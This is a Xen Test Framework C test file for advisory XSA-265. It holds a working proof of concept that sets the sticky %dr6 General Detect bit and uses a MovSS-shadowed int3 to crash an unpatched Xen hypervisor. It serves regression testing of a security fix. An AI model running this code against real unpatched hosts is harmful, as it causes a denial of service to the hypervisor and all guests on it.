/**
 * @file tests/xsa-265/main.c
 * @ref test-xsa-265
 *
 * @page test-xsa-265 XSA-265
 *
 * Advisory: [XSA-265](https://xenbits.xen.org/xsa/advisory-265.html)
 *
 * One of the fixes for
 * [XSA-260](https://xenbits.xen.org/gitweb/?p=xen.git;a=commitdiff;h=75d6828bc2146d0eea16adc92376951a310d94a7)
 * introduced logic to try and prevent livelocks of @#DB exceptions in
 * hypervisor context.  However, it failed to account for the fact that some
 * %dr6 bits are sticky and never cleared by hardware.
 *
 * This test sets the sticky `%%dr6.DB` bit, then uses a `MovSS` shadow to
 * deliver a @#DB exception in hypervisor context.  A vulnerable Xen will
 * trigger the safety check and crash.
 *
 * @see tests/xsa-265/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-265 PoC";

void test_main(void)
{
    unsigned int ss = read_ss();
    unsigned long dr7 = DR7_SYM(0, L, G, RW, 32) | X86_DR7_LE | X86_DR7_GE;

    /* Latch the sticky General Detect flag in %dr6 */
    write_dr6(X86_DR6_BD);

    /* Data breakpoint for `ss`, working around Xen's %dr7 latching bug. */
    write_dr0(_u(&ss));
    write_dr7(dr7);
    write_dr7(dr7);

    asm volatile ("mov %[ss], %%ss; int3; 1:"
                  _ASM_TRAP_OK(1b)
                  :: [ss] "m" (ss));

    /*
     * If Xen is still alive at this point, the erroneous safety check didn't
     * trip.
     */

    write_dr7(0);
    write_dr7(0);

    xtf_success("Success: Not vulnerable to XSA-265\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
